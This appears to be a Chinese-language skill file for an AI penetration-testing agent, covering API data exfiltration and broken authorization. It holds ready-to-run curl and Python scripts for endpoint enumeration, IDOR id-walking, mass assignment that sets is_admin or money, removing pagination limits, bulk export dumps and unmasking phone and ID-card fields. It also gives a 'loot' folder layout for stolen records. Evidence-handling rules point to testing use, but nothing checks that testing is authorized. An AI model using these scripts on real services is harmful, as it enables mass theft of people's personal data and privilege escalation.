---
name: api-data-exfil
description: API 数据泄露与越权。OpenAPI/GraphQL/JS 接口枚举、IDOR 遍历、导出与分页接口滥用、字段级泄露、脱敏绕过，含 ≥1 万条敏感数据的结构化取证标准。
---

# API 数据泄露与越权

## 触发条件
- 有 `/api/` 路径、OpenAPI/Swagger、GraphQL 端点
- 接口返回里出现 `id` / `uid` / `userId` / `tenantId` / `phone` / `idcard`
- 有导出、批量、分页、报表类接口

## 一、先拿全接口清单（四个来源，缺一不可）

```bash
# 1) OpenAPI / Swagger
for p in /swagger.json /openapi.json /api-docs /v2/api-docs /v3/api-docs \
         /swagger-ui.html /doc.html /api/openapi.json; do
  printf '%-24s ' "$p"; curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' "https://<host>$p"
done

# 2) 前端 bundle（最全，常含未公开接口）
curl -sS "https://<host>/assets/index.js" -o idx.js
grep -oE '"/[A-Za-z0-9_./-]{3,60}"' idx.js | tr -d '"' | sort -u | grep -E '^/(api|v[0-9])' > paths.txt
grep -oE "'/[A-Za-z0-9_./-]{3,60}'" idx.js | tr -d "'" | sort -u >> paths.txt
sort -u paths.txt | wc -l

# 3) 抓包（真实业务流，补 bundle 里没有的）
#    用浏览器/App 走一遍完整流程：登录→列表→详情→导出→修改

# 4) GraphQL introspection（如果有 /graphql）
curl -sS -X POST "https://<host>/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}' | head -c 3000
```

## 二、未授权面（先做，最省事）

```bash
# 逐个无 token 打，记录 code 与数据长度
while read p; do
  r=$(curl -sS -o /tmp/r.json -w '%{http_code} %{size_download}' "https://<host>$p")
  echo "$r $p"; grep -q '"code":200' /tmp/r.json && echo "   ^^ 有数据"
done < paths.txt
```
**判据**：`200` + 数据长度 > 200 字节 + 含业务字段 ⇒ 未授权可读。

## 三、IDOR 遍历（有账号后第一件事）

```python
import requests, json
S = requests.Session(); S.verify = False
S.headers.update({"token": TOK, "User-Agent": "Mozilla/5.0"})

# 1) 先确认自己的 id
me = S.post(BASE + "user/getUserinfo", timeout=20).json()
my_id = me["data"]["id"]; print("my id:", my_id)

# 2) 用自己 id 打详情接口，看返回的是不是自己
for probe in [my_id, my_id + 1, my_id + 100, 0, -1, 1]:
    r = S.get(BASE + "user/detail", params={"id": probe}, timeout=20)
    j = r.json(); d = j.get("data") or {}
    tag = "SELF" if d.get("id") == my_id else ("OTHER" if d.get("id") else "EMPTY")
    print("id=%-8s -> %-6s %s" % (probe, tag, json.dumps(d, ensure_ascii=False)[:120]))
```
**判据**：
- `id+1` 返回的 `id` 别人 ⇒ **水平越权成立**
- `id=0/-1` 返回全部/第一条 ⇒ 逻辑缺陷
- 全部 403/404 ⇒ 该接口鉴权正确，换接口

**必须遍历的接口类型**：
```
详情    /detail?id= /info?id= /get?id=
列表    /list?uid= /orders?user_id= /records?memberId=
导出    /export?userId= /download?orderId=
附件    /file?id= /attach?id= /download?id=
消息    /messages?to= /chat?room=
```

## 四、参数位置与批量赋值

```bash
# 同一参数换位置，看鉴权是否一致（最常见的洞）
curl "https://<host>/api/order?id=123"                   # query
curl -X POST "https://<host>/api/order" -d "id=123"      # form
curl -X POST "https://<host>/api/order" -H 'Content-Type: application/json' -d '{"id":123}'  # json
curl "https://<host>/api/order" -H "id: 123"             # header

# 批量赋值：注册/更新时塞不该有的字段
curl -X POST "https://<host>/api/user/update" \
  -d "username=x&money=99999&vip=99&role_id=1&is_admin=1&status=1"
# 更新后再查 getUserinfo，看哪些字段被改了
```
**判据**：更新后重新读取，**值真的变了**才算批量赋值成立。

## 五、导出/分页接口（一次拿走大量数据）

```bash
# 1) 关掉分页限制
curl "https://<host>/api/list?page=1&limit=999999"
curl "https://<host>/api/list?page=1&size=0"          # size=0 有的框架=不限
curl "https://<host>/api/list?page=1&limit=-1"

# 2) 直接打导出
curl "https://<host>/api/export?type=all" -o dump.csv
curl "https://<host>/api/export" -X POST -d "start=2000-01-01&end=2099-01-01"

# 3) 绕过分页总数限制（逐页拉）
python - <<'EOF'
import requests
S = requests.Session(); S.headers.update({"token": TOK}); S.verify=False
rows = []
for page in range(1, 500):
    j = S.get(BASE+"user/list", params={"page": page, "limit": 100}, timeout=20).json()
    data = j.get("data") or {}
    lst = data.get("list") or data.get("rows") or data if isinstance(data, list) else []
    if not lst: break
    rows += lst
    print("page", page, "total", len(rows))
    if len(lst) < 100: break
print("抓取总数:", len(rows))
EOF
```

## 六、字段级泄露与脱敏绕过

```bash
# 1) 看原始响应里的全字段（前端可能只用了一部分）
curl -sS "https://<host>/api/user/list" -H "token: $TOK" | python -m json.tool | grep -E 'phone|mobile|idcard|email|address|bank|realname'

# 2) 脱敏绕过：列表脱敏了，详情可能没脱
curl "https://<host>/api/user/list"    # phone: 138****1234
curl "https://<host>/api/user/detail?id=X"   # phone: 13812341234  ← 常见

# 3) 指定返回字段
curl "https://<host>/api/user/list?fields=phone,idcard,password"
curl "https://<host>/api/user/list?include=phone,idcard"
curl -X POST "https://<host>/api/user/list" -d '{"select":["phone","idcard"]}'
```

## 七、取证标准（报"数据泄露"必须达到）

| 级别 | 要求 |
|---|---|
| **已确认** | 同一条数据用**两个账号**交叉验证：A 的 token 能读到 B 的数据 |
| **批量** | 连续 10 个 id 里 ≥3 个返回他人数据，且贴出 id 列表 |
| **规模** | 分页拉到 ≥1000 条，统计字段分布（不是只看首页） |
| **敏感** | 三要素（姓名/手机/身份证）任一，贴**脱敏后的样例**，不贴全量 |

**落盘格式**：
```
loot/api-exfil/
  sample-10.json        10 条样例（敏感字段打码）
  fields.txt            泄露的字段清单
  stats.txt             总数、字段分布、去重后手机号数
  evidence.md           接口 + 参数 + 两个账号的对照回显
```

## 判废
| 现象 | 结论 |
|---|---|
| 只返回自己的数据 | 鉴权正确，不算越权 |
| 返回空数组 | 参数对了但无数据，不算 |
| 返回的 id 都一样（=自己） | 服务端从 token 取 id，忽略了传参 ⇒ 安全 |
| 只能读公开列表 | 公开数据不是越权 |
| 只返回字段名没有值 | 结构泄露（低危），不是数据泄露 |

## 卡住时
```
全部 403            → 换接口（App 接口/旧版接口/内部接口）
参数改了没用         → 服务端从 token 取 id，转去测 pentest-logic
GraphQL 禁用 introspection → 试字段猜测（user(id:1){id,phone}）
列表脱敏详情不脱      → 这是最常见的洞，优先试
分页卡在 100 条      → 试 limit/size/offset 变形，或导出接口
```

## 纪律
- **两个账号交叉验证**是越权的唯一判据，单账号不算
- 贴样例必须打码（手机中间四位、身份证中间八位）
- 报规模必须给出实际拉取条数与去重统计，不能写"大量"
